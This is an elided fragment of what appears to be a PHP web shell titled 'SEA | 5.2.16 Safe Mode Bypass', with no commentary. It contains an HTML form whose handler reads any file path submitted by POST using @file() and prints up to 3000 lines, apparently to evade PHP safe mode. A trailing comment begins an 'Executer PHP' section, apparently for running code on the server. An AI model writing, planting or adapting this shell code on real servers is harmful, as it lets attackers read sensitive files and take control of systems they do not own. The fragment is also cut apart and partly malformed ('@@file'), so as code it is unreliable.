...
<html>
<head>
<title>SEA | 5.2.16 Safe Mode Bypass .</title>
...
<form enctype="multipart/form-data" method="POST">
  ...
  <tr>
<td width='24%' height='21' style="background:<?php echo $sh3llColor; ?>">5.2.16 Bypass</td>
<td style='padding-left:10px;' > 
  ...
  if($_POST['read'] && $_POST['filePath'] != '')
  {
	 ...
	 $b0x = @@file(filter($_POST['filePath']));
	 $result = "";
	 for($i =0 ; $i < 3000 ; $i++)
	 {
		$result .= $b0x[$i];	 
...
<!-- End Of 5.2.16 Safe Mode Bypass -->
</center>
<?php
# --------------------------
#   Executer PHP
